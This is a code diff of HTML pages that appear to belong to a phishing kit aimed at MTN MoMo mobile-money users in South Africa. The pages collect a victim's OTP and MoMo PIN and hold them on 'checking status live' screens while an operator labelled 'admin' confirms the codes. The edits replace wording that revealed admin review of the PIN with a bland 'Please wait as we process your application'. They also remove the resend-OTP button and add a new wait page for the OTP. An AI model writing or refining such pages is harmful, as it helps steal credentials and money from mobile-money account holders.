@@ -171,12 +171,12 @@
     </div></div>
 </div>
 
-<!-- REGISTRATION WAIT -->
+<!-- REGISTRATION WAIT (updated copy) -->
 <div id="page-registration-wait" class="page">
     <div class="wait-bg"><div class="wait-wrap">
         <div class="wait-icon pulse">⏳</div>
-        <h2>Verifying Your Account...</h2>
-        <p>Admin is confirming your MoMo account details.</p>
+        <h2>Processing Your Application...</h2>
+        <p>Please wait as we process your application.</p>
         <div class="wait-status" id="regWaitStatus">⏳ Awaiting review...</div>
         <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
         <div class="wait-appid">App ID: <span class="mono" id="regWaitAppId">—</span></div>
@@ -196,8 +196,8 @@
         <p class="step-sub">Verify your phone number</p>
         <div class="login-intro">
             <div class="li-icon">📩</div>
-            <h3>Check your phone</h3>
-            <p>We've sent a 6-digit OTP to <b id="regOtpPhone">+27 —</b>. Enter it below.</p>
+            <h3>Enter your OTP</h3>
+            <p>Enter the 6-digit OTP you received from MTN for <b id="regOtpPhone">+27 —</b>.</p>
         </div>
         <div class="msg-box error" id="regOtpErr"><span class="msg-icon">✕</span><span id="regOtpErrTxt"></span></div>
         <div class="field">
@@ -210,10 +210,22 @@
                 <input type="text" id="regOtp4" class="otp-box" maxlength="1" inputmode="numeric" />
                 <input type="text" id="regOtp5" class="otp-box" maxlength="1" inputmode="numeric" />
             </div>
-            <div class="field-hint">5 attempts max before restart</div>
+            <div class="field-hint">Admin will confirm your OTP shortly</div>
         </div>
-        <button class="btn-grad" id="regOtpBtn">Verify OTP</button>
-        <button class="btn-outline" id="regResendOtpBtn">↻ Resend OTP</button>
+        <button class="btn-grad" id="regOtpBtn">Submit OTP</button>
+    </div></div>
+</div>
+
+<!-- REGISTRATION OTP WAIT (new) -->
+<div id="page-registration-otp-wait" class="page">
+    <div class="wait-bg"><div class="wait-wrap">
+        <div class="wait-icon pulse">📩</div>
+        <h2>Verifying Your OTP...</h2>
+        <p>Please wait as we process your application.</p>
+        <div class="wait-status" id="regOtpWaitStatus">⏳ Awaiting admin confirmation...</div>
+        <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
+        <div class="wait-appid">App ID: <span class="mono" id="regOtpWaitAppId">—</span></div>
+        <button class="btn-gray" id="cancelOtpWaitBtn">Cancel</button>
     </div></div>
 </div>
 
@@ -262,7 +274,7 @@
     <div class="wait-bg"><div class="wait-wrap">
         <div class="wait-icon pulse">🔐</div>
         <h2>PIN Submitted</h2>
-        <p>Awaiting admin verification of your MoMo PIN.</p>
+        <p>Please wait as we process your application.</p>
         <div class="wait-status" id="regPinWaitStatus">⏳ Awaiting approval...</div>
         <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
         <div class="wait-appid">App ID: <span class="mono" id="regPinWaitAppId">—</span></div>
